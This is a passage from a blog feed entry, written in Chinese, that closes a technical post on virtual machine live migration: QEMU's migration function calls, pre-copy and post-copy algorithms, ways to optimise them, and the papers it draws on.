&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正是&lt;code&gt;register_savem_live&lt;/code&gt;函数将&lt;code&gt;ram_save_live&lt;/code&gt;指针传递给了&lt;code&gt;save_live_state&lt;/code&gt;，前文说了，&lt;code&gt;ram_save_live&lt;/code&gt;便是真正执行迁移工作的函数，这里如果需要自定义迁移工作，修改&lt;code&gt;ram_save_live&lt;/code&gt;注册到&lt;code&gt;register_savevm_live&lt;/code&gt;函数中就行了。了解清楚这一连串的函数调用关系，便能彻底明白迁移的每一步工作。&lt;/p&gt;
&lt;h2 id=&quot;思考&quot;&gt;&lt;a href=&quot;#思考&quot; class=&quot;headerlink&quot; title=&quot;思考&quot;&gt;&lt;/a&gt;思考&lt;/h2&gt;&lt;p&gt;本文重点介绍了pre-copy迁移算法的详细过程，并简单介绍了post-copy算法，两个算法各有优缺点，也都各有改进之处。虚拟机迁移的初衷是保证云平台的高可用性，高可用性要尽量减少提供服务的云主机的宕机时间即停机时间，在此同时，也应尽量减少迁移过程中带来的性能开销，就像post-copy若不断的缺页，虽保证了极短的宕机时间，但如果性能损失太大也是无法接受的。目前多数优化迁移算法的工作主要是采取减少传输的内存数据量来实现，而为了减少内存数据量，又有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;压缩内存&lt;/li&gt;
&lt;li&gt;基于hash指纹找出相同或类似页面去重&lt;/li&gt;
&lt;li&gt;尽可能传输不必要的页面如free页面等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除此之外，也有工作不传输整个内存页面，而是传输内存页面到外部设备的映射关系，目的端则靠此映射关系从外设获取数据。这里不一一列出相关论文，若有兴趣深入者，可自行查阅。笔者也有一部分工作提出了相应的思路与实现，之后会有专门文章作详细介绍。&lt;/p&gt;
&lt;p&gt;如果你对迁移算法的优化有什么看法或什么建议，可留言，也可直接与我邮件联系。&lt;/p&gt;
&lt;h2 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p&gt;崔磊先生的博士论文&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.usenix.org/legacy/event/nsdi05/tech/full_papers/clark/clark.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NSDI’05 Live Migration of Virtual Machines&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cs.binghamton.edu/~mhines/papers/vee2009.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;VEE’09 Post-Copy Based Live Virtual Machine Migration Using Adaptive Pre-Paging and Dynamic Self-Ballooning&lt;/a&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;如转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2016/01/02/highavailability-migration/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/01/02/highavailability-migration/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;无序，直接看文章。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;什么是云平台高可用&lt;/li&gt;
&lt;li&gt;虚拟机迁移主要算法&lt;/li&gt;
&lt;li&gt;实现 Pre-copy&lt;/li&gt;
&lt;li&gt;思考&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是云平台高可用&quot;&gt;&lt;a href=&quot;#什么是云平台高可用&quot; class=&quot;headerlink&quot; title=&quot;什么是云平台高可用&quot;&gt;&lt;/a&gt;什么是云平台高可用&lt;/h2&gt;&lt;p&gt;云，一个再熟悉不过的词了。大家都看到了云计算的商业价值，于是乎各大IT公司都纷纷提出自己的云计算服务，有Amozon的EC2，微软的Azure,谷歌的Google AppEngine,腾讯云，百度云，阿里云等。说到Google AppEngine，相信许多用goagent翻墙党都用过这个东西，但估计大家都只忙着使用goagent，却忽略了AppEngine其中提供的云服务。如今，云无处不在，从当今主流产品看，云平台需要满足以下几个需求：&lt;/p&gt;
    
    </summary>
    
      <category term="virtualization" scheme="http://yoursite.com/categories/virtualization/"/>
    
    
      <category term="Virtualization" scheme="http://yoursite.com/tags/Virtualization/"/>
    
      <category term="Migration" scheme="http://yoursite.com/tags/Migration/"/>
    
      <category term="Cloud" scheme="http://yoursite.com/tags/Cloud/"/>
    
  </entry>
  
</feed>
